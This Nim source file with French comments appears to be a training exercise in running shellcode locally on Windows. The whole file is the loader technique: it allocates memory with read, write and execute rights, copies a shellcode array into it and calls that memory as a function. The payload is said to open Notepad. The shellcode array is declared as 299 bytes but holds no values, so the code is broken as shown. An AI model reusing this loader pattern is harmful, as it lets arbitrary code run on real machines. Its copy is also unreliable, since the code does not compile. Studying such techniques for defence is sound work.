import winim/lean

# Code très proche de l'exo1 car c'est une variante, 
# La principale différence est qu'on ne crée pas de thread, le shellcode est executé comme simple fonction Nim

proc injectLocal[I, T](shellcode: var array[I, T]): void =

    # Allocation de la mémoire
    let executable_memory = VirtualAlloc(
        nil,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    #Copie du shellcode dans la mémoire
    copyMem(executable_memory, shellcode[0].addr, len(shellcode))

    # On crée un pointeur pour executer le shellcode dans le même thread que celui de l'application courante
    let f = cast[proc(){.nimcall.}](executable_memory)
    f()

when defined(windows):

    #Shellcode: ouvre l'application bloc-note
   var buf: array[299, byte] = [
    byte  ]


    # Point d'entrée, on execute la fonction d'injection
    when isMainModule:
        injectLocal(buf)